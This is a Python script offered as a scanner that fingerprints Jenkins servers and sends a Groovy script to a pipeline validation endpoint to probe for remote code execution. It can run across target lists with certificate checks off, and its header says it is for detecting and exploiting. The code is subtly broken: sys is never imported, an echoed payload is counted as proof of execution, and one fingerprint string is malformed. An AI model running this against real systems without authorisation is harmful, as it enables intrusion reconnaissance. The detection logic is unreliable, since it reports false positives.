#!/usr/bin/env python3
"""
Jenkins Scripted Pipeline RCE Scanner
======================================
This is a security scanner for detecting and exploiting remote code execution
(RCE) vulnerabilities in misconfigured Jenkins scripted pipelines.

Vulnerability Description:
  - Jenkins scripted pipelines often allow remote code execution due to
    misconfigurations or insufficient security controls. This happens when
    script-security protections are disabled or when scripts are improperly
    validated.
  - Exploitable by submitting Groovy scripts able to run arbitrary system 
    commands via pipeline definitions.

Key Features:
  - Identifies misconfigured Jenkins instances with scripted pipelines.
  - Extracts Jenkins version and matches it against known vulnerable versions.
  - Probes for RCE vulnerability by sending crafted Groovy scripts.

Dependencies:
  - `httpx` (for asynchronous HTTP requests)
  - Python 3.10+ required

Usage:
  # Scan a single target
  python jenkins_pipeline_rce_scanner.py --target https://jenkins.example.com

  # Scan a list of targets
  python jenkins_pipeline_rce_scanner.py --list targets.txt --output results.json

  # Safe mode (detection only, no RCE probing)
  python jenkins_pipeline_rce_scanner.py --list targets.txt --safe

  # Increase concurrency for faster scanning
  python jenkins_pipeline_rce_scanner.py --list targets.txt --concurrency 50

References:
  - https://www.jenkins.io/doc/pipeline/
  - https://www.jenkins.io/doc/book/security/
"""

import asyncio
import argparse
import httpx
import json
import re
from urllib.parse import urljoin

# Constants
JENKINS_FINGERPRINTS = [
    "<title>Dashboard [Jenkins</title>",
    "Welcome to Jenkins!", 
    "/static/xyz/css/style.css",
]
RCE_PAYLOAD = {
    "script": "println('RCE-Test: Execute command succeeded')",
    "Jenkins-Crumb": ""
}
REQUEST_TIMEOUT = 10
SEMAPHORE_LIMIT = 10

# ANSI Output Settings
RESET_COLOR = "\033[0m"
INFO_COLOR = "\033[92m"  # Green
HIGH_COLOR = "\033[93m"  # Yellow
CRITICAL_COLOR = "\033[91m"  # Red

# Helper Functions
def normalize_url(url):
    """Ensures the URL has a scheme and no trailing slash."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    return url.rstrip("/")

def print_message(level, message):
    """Prints a color-coded message to the console."""
    color = RESET_COLOR
    if level == "INFO":
        color = INFO_COLOR
    elif level == "HIGH":
        color = HIGH_COLOR
    elif level == "CRITICAL":
        color = CRITICAL_COLOR
    print(f"{color}[{level}] {message}{RESET_COLOR}")

async def fingerprint_jenkins(client, url, semaphore):
    """Check if the target is potentially running Jenkins."""
    async with semaphore:
        try:
            response = await client.get(url, timeout=REQUEST_TIMEOUT)
            if response.status_code == 200:
                for fingerprint in JENKINS_FINGERPRINTS:
                    if fingerprint in response.text:
                        return True
        except httpx.RequestError as e:
            print_message("INFO", f"Error connecting to {url}: {str(e)}")
        return False

async def extract_version(client, url, semaphore):
    """Extracts the Jenkins version from the target."""
    async with semaphore:
        try:
            response = await client.get(urljoin(url, "/login"), timeout=REQUEST_TIMEOUT)
            version_match = re.search(r"Jenkins ver\. (\d+\.\d+)", response.text)
            if version_match:
                return version_match.group(1)
        except Exception:
            pass
    return None

async def test_pipeline_rce(client, url, semaphore):
    """Probes for RCE vulnerability in Jenkins scripted pipeline endpoint."""
    async with semaphore:
        csrf_token = ""
        try:
            # Retrieve CSRF token if applicable
            crumb_response = await client.get(urljoin(url, "/crumbIssuer/api/json"), timeout=REQUEST_TIMEOUT)
            if crumb_response.status_code == 200:
                crumb_data = crumb_response.json()
                csrf_token = crumb_data.get("crumb", "")
                RCE_PAYLOAD["Jenkins-Crumb"] = csrf_token
            
            # Send RCE payload
            pipeline_response = await client.post(
                urljoin(url, "/pipeline-model-converter/validate"),
                json=RCE_PAYLOAD,
                timeout=REQUEST_TIMEOUT,
            )
            if RCE_PAYLOAD["script"] in pipeline_response.text:
                return True
        except Exception:
            pass
    return False

async def scan_target(client, url, semaphore, safe):
    """Conducts a full vulnerability scan of the target."""
    url = normalize_url(url)
    print_message("INFO", f"Scanning {url}...")
    result = {
        "url": url,
        "is_jenkins": False,
        "jenkins_version": None,
        "is_vulnerable": None
    }

    # Fingerprint
    is_jenkins = await fingerprint_jenkins(client, url, semaphore)
    result["is_jenkins"] = is_jenkins
    if not is_jenkins:
        print_message("INFO", f"{url} is not a Jenkins instance.")
        return result

    # Extract version
    version = await extract_version(client, url, semaphore)
    result["jenkins_version"] = version
    print_message("INFO", f"Detected Jenkins version: {version} for {url}")

    # RCE probing
    if not safe:
        is_vulnerable = await test_pipeline_rce(client, url, semaphore)
        if is_vulnerable:
            result["is_vulnerable"] = True
            print_message("CRITICAL", f"{url} is vulnerable to RCE!")
        else:
            result["is_vulnerable"] = False
            print_message("HIGH", f"{url} does not appear vulnerable.")
    return result

async def main(args):
    semaphore = asyncio.Semaphore(args.concurrency)
    async with httpx.AsyncClient(verify=not args.no_verify) as client:
        if args.target:
            results = [await scan_target(client, args.target, semaphore, args.safe)]
        elif args.list:
            with open(args.list, "r") as f:
                urls = [line.strip() for line in f if line.strip()]
            tasks = [scan_target(client, url, semaphore, args.safe) for url in urls]
            results = await asyncio.gather(*tasks)

    # Output results
    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=4)
    else:
        for result in results:
            print(json.dumps(result, indent=4))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Jenkins Pipeline RCE Scanner")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="JSON file to save the results")
    parser.add_argument("--safe", action="store_true", help="Detection mode only (no RCE probing)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent scans (default: 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL/TLS certificate verification")
    args = parser.parse_args()

    if not args.target and not args.list:
        print("Please provide a target URL or a list of targets (--target or --list).")
        parser.print_help()
        sys.exit(1)

    asyncio.run(main(args))
